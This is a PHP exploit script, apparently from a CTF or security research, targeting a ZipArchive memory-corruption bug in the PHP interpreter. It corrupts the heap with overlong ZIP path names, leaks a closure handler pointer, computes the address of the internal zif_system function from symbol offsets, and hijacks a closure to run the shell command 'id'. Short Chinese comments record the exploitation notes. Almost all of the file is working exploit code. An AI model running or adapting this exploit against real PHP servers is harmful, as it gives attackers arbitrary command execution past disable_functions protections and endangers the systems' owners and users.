<?php

function write2str(&$str,$offset,$stub){
	for($i=0;$i<strlen($stub);$i++){
		//zend_assign_to_string_offset
		$str[$offset+$i]=$stub[$i];
	}
}

function read4str($str,$offset,$len){
	$stub="";
	for($i=0;$i<$len;$i++){
		$stub=$stub.$str[$offset+$i];
	}

	return $stub;
}

function ptr2str($ptr, $m=8)
{
	$out = "";
    for ($i=0; $i<$m; $i++)
    {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

function str2ptr(&$str, $p, $s=8)
{
	$address = 0;
	for($j=$p+$s-1;$j>=$p;$j--)
	{
		$address <<= 8;
		$address |= ord($str[$j]);
	}
	return $address;
}

class maple{
	public $a;
	public $b;
}
$stub1="aaa";
//$helper = array(0=>$stub1);
//$helper->a = function($c){};
$zip = new ZipArchive;
$res = $zip->open('./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.zip');
//32+30+255+1 == 318	
$res = $zip->open('deafbuff');
$a = trim(" AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.zip");
//32+256+30 == 318
unset($zip);
//$b = trim(" AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb.zip");
$d=function($c){};
//$helper->b='aaaa';	
//write2str($a,0x20,ptr2str(1));
//write2str($a,0x68-0x18,ptr2str(0x55555592fb90));
//($d)('ls');
//0x55555592fb90 zif_system	
$adr=read4str($a,0x18-0x18,8);
printf("%x",$adr=str2ptr($adr,0));
/*
➜ maple bin readelf -s ./php |grep closure_handlers
  8146: 00000000010199c0   208 OBJECT  LOCAL  DEFAULT   26 closure_handlers
➜ maple bin readelf -s ./php |grep zif_system      
 11840: 00000000003dbb90    10 FUNC    LOCAL  DEFAULT   14 zif_system
*/ 

$zif_system=$adr-(0x10199c0-0x3dbb90);
write2str($a,0x20,ptr2str(1));
write2str($a,0x68-0x18,ptr2str($zif_system));
($d)('id');

//arw 已经有了
//没有二进制
//爆破符号表？？？ 假设有offset，有路径，
//这里控制了一个zend_string,没什么什么实际作用
//php7里面注意zval已经不会再堆上分配了
//array obj ....